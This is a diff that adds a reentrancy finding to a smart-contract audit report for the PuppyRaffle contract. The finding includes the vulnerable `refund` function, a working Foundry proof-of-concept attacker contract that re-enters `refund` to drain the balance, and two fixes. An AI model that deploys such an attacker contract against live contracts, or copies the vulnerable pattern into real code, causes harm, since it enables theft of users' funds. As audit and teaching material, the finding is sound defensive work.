@@ -136,3 +136,136 @@ Replace the current randomness mechanism with Chainlink VRF (Verifiable Random F
    - Ensure proper access controls on the callback function
 
 Note: Chainlink VRF introduces a two-transaction pattern (request + fulfill), so the contract architecture will need to be refactored to accommodate this asynchronous flow.
+### [M-#] Reentrancy in `PuppyRaffle::refund` allows entrant to drain raffle balance
+
+**Description:** The `PuppyRaffle::refund` function does not follow the Checks-Effects-Interactions pattern (or CEI) and as a result, enables participants to drain the contract balance. 
+
+In the `refund` function, we perform an external call to `msg.sender` *before* updating the `players` array to zero out the player. 
+
+```solidity
+    function refund(uint256 playerIndex) public {
+        address playerAddress = players[playerIndex];
+        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+
+        payable(msg.sender).sendValue(entranceFee); // <@-- External call writes to address(0)
+
+        players[playerIndex] = address(0); // <@-- State update happens AFTER external call
+        emit RaffleRefunded(playerAddress);
+    }
+```
+
+A player who has entered the raffle can have a `fallback`/`receive` function that calls the `refund` function again and claim another refund. They can continue the cycle till the contract balance is drained. 
+
+**Impact:** All fees paid by raffle entrants can be stolen by the malicious participant. 
+
+**Proof of Concept:** 
+
+1. User enters the raffle
+2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`
+3. Attacker enters the raffle
+4. Attacker calls `refund` from their attack contract, draining the contract balance.
+
+**Proof of Code**
+
+<details>
+<summary>Code</summary>
+
+```solidity
+function test_reentrancyRefund() public {
+    address[] memory players = new address[](4);
+    players[0] = playerOne;
+    players[1] = playerTwo;
+    players[2] = playerThree;
+    players[3] = playerFour;
+    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+    ReentrancyAttacker attacker = new ReentrancyAttacker(puppyRaffle); 
+    address attackUser = makeAddr("attackUser"); 
+    vm.deal(attackUser, 1 ether);
+
+    uint256 startngAttackerBalance = address(attacker).balance;
+    uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;
+
+    vm.prank(attackUser);
+    attacker.attack{value: entranceFee}();
+
+    uint256 endingAttackerBalance = address(attacker).balance;
+    uint256 endingPuppyRaffleBalance = address(puppyRaffle).balance;
+
+    console.log("Starting attacker balance", startngAttackerBalance);
+    console.log("Ending attacker balance", endingAttackerBalance);
+    console.log("Starting puppy raffle balance", startingPuppyRaffleBalance);
+    console.log("Ending puppy raffle balance", endingPuppyRaffleBalance);
+
+}
+
+contract ReentrancyAttacker {
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee;
+    uint256 attackerIndex;
+
+    constructor(PuppyRaffle _puppyRaffle) {
+        puppyRaffle = _puppyRaffle;
+        entranceFee = puppyRaffle.entranceFee();
+    }
+
+    function attack() public payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackerIndex);
+    }
+
+    function _stealMoney() internal {
+        if (address(puppyRaffle).balance >= entranceFee) {
+            puppyRaffle.refund(attackerIndex);
+        }
+    }
+
+    fallback() external payable {
+        _stealMoney();
+    }
+
+    receive() external payable {
+        _stealMoney();
+    }
+}
+```
+
+</details>
+
+
+**Recommended Mitigation:** 
+1. **Use CEI pattern:** To prevent this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally, we should move the event emission up as well. 
+
+```diff
+    function refund(uint256 playerIndex) public {
+        address playerAddress = players[playerIndex];
+        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+
++       players[playerIndex] = address(0);
++       emit RaffleRefunded(playerAddress);
+        payable(msg.sender).sendValue(entranceFee);
+
+-       players[playerIndex] = address(0);
+-       emit RaffleRefunded(playerAddress);
+    }
+```
+
+2. **Use ReentrancyGuard:**
+Alternatively, you can use [OpenZeppelin's ReentrancyGuard](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard) modifier. This prevents a function from being called while it is already executing.
+
+> **Note:** The `nonReentrant` modifier works by using a mutex lock (a boolean flag) that is set to true when the function starts and set back to false when it ends. If the function is re-entered while the flag is true, the transaction reverts.
+
+```diff
++ import {ReentrancyGuard} from "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+
+- contract PuppyRaffle is ERC721, Ownable {}
++ contract PuppyRaffle is ERC721, Ownable, ReentrancyGuard {}
+
+-   function refund(uint256 playerIndex) public {}
++   function refund(uint256 playerIndex) public nonReentrant {}
+```
